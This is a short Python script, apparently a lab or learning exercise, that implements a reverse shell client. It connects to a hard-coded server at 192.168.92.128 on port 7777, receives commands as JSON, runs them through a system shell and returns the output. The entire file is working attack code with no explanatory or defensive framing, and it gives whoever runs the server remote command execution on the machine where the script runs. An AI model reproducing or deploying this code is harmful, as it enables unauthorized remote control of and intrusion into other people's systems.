#!/usr/bin/python

import socket
import subprocess
import json

def send_j(data):
    json_data = json.dumps(data)
    s.send(json_data.encode('utf-8'))

def recv_j():
        data = ""
        while True:
            try:
                data = data + s.recv(1024).decode('utf-8') #receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
                return json.loads(data) #
            except ValueError: #if the output of json.loads(data) is not complete (not in json format)a
                continue

def shell():
    while True:
        cmd = recv_j() # receive command from server
        if cmd == "exit_client":
            break
        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        send_j(output.decode('utf-8')) #send output to server

#socket creation
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect
s.connect(("192.168.92.128",7777)) #server IP and to which port to connect to
shell()
s.close()